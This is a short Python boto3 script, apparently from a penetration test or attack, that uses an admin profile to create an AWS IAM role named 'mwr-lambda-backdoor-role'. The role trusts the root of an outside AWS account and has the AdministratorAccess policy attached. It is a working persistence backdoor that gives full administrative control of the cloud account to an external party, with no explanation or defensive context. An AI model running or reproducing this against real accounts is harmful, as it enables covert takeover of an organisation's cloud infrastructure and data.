import boto3
import json

s = boto3.session.Session(profile_name="sanlam-dev-admin")

iam = s.client('iam')


AssumeRolePolicyDocument = {
  "Version": "2012-10-17",
  "Statement": {
    "Effect": "Allow",
    "Principal": {"AWS": "arn:aws:iam::621717904109:root"},
    "Action": "sts:AssumeRole"
  }
}

options = {}
options["RoleName"] = "mwr-lambda-backdoor-role"
options["AssumeRolePolicyDocument"] = json.dumps(AssumeRolePolicyDocument)

PolicyArn = "arn:aws:iam::aws:policy/AdministratorAccess"


iam.create_role(**options)

iam.attach_role_policy(RoleName=options["RoleName"],PolicyArn=PolicyArn)